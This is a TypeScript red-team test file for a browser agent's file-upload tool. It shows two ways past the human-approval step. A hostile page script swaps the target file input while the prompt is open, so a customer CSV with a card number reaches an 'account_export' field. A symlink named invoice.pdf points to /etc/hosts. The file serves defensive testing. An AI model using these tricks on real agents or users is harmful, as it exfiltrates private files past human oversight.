/**
 * BR-09 — upload approval is bound to a message, not to the element it writes to.
 *
 * upload.ts resolves the caller's locator, validates the files, then asks the
 * human, then calls `locator.setInputFiles(...)`. The Playwright locator is lazy
 * and is re-resolved *after* the approval, so a page that rewrites its DOM while
 * the approval prompt is open receives the approved local files in a different
 * file input — the one the user was never shown. The prompt also names only
 * `basename(path)`, and `stat()` follows symlinks, so any reachable file passes
 * validation under a harmless-looking name.
 */
import { afterAll, beforeAll, expect, it } from 'vitest'
import { mkdtemp, mkdir, rm, symlink, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import type { Browser } from 'playwright'
import { runBrowserUpload } from '../../../packages/dsh-browser-use-d1/src/upload.ts'
import { uiStrings } from '@albaincompleta/dsh-cu-core/locale'
import { approvalSpy, config, launch, newPage } from './harness.ts'

let browser: Browser
let root: string
beforeAll(async () => {
  browser = await launch()
  root = await mkdtemp(join(tmpdir(), 'br09-upload-'))
  await mkdir(join(root, 'private', 'customers'), { recursive: true })
  await writeFile(join(root, 'private', 'customers', 'pii.csv'), 'name,card\nada,4111\n')
})
afterAll(async () => {
  await browser.close()
  await rm(root, { recursive: true, force: true })
})

const strings = uiStrings('en')
const agent = { id: 'redteam-agent' } as never

it('the page can move the approval to a different file input before the write', async () => {
  const page = await newPage(browser)
  await page.setContent(`
    <h1>Profile</h1>
    <form id="avatar-form" action="/upload-avatar" method="post" enctype="multipart/form-data">
      <input id="approved" name="avatar" type="file">
    </form>
    <script>
      window.__sink = null; window.__content = null;
      // Runs while the human is reading the approval prompt.
      window.swapTargets = () => {
        const approved = document.getElementById('approved');
        const exportInput = document.createElement('input');
        exportInput.id = 'approved';            // same locator now resolves here
        exportInput.type = 'file';
        exportInput.name = 'account_export';    // different destination field
        exportInput.addEventListener('change', async () => {
          const file = exportInput.files[0];
          window.__sink = exportInput.name;
          window.__content = await file.text();
        });
        approved.id = 'retired';
        approved.name = 'retired';
        document.body.appendChild(exportInput);
      };
    </script>`)

  const spy = approvalSpy(true, async () => { await page.evaluate(() => (window as never as { swapTargets: () => void }).swapTargets()) })
  const file = join(root, 'private', 'customers', 'pii.csv')
  const result = await runBrowserUpload(
    page, config(), strings, spy as never, agent,
    { locator: { kind: 'css', selector: '#approved' }, files: [file] },
    new AbortController().signal,
  )

  expect(result.status).toBe('success')
  // What the human was shown: a basename and the *old* field name.
  expect(spy.calls).toHaveLength(1)
  expect(spy.calls[0]!.detail).toContain('pii.csv')
  expect(spy.calls[0]!.detail).not.toContain(join(root, 'private'))
  expect(spy.calls[0]!.detail).toContain('avatar')
  // What actually received the bytes: a different input the page created mid-approval.
  expect(await page.evaluate(() => (window as unknown as { __sink: string | null }).__sink)).toBe('account_export')
  expect(await page.evaluate(() => (window as unknown as { __content: string | null }).__content)).toContain('4111')
  await page.context().close()
})

it('accepts a symlink as a regular file, so the approved name hides the real target', async () => {
  const page = await newPage(browser)
  await page.setContent('<input id="f" name="upload" type="file">')
  const link = join(root, 'invoice.pdf')
  await symlink('/etc/hosts', link)
  const spy = approvalSpy(true)
  const result = await runBrowserUpload(
    page, config(), strings, spy as never, agent,
    { locator: { kind: 'css', selector: '#f' }, files: [link] },
    new AbortController().signal,
  )
  expect(result.status).toBe('success')
  expect(spy.calls[0]!.detail).toContain('invoice.pdf')
  expect(await page.evaluate(() => {
    const input = document.getElementById('f') as HTMLInputElement
    return input.files?.[0]?.name ?? null
  })).toBe('invoice.pdf')
  await page.context().close()
})
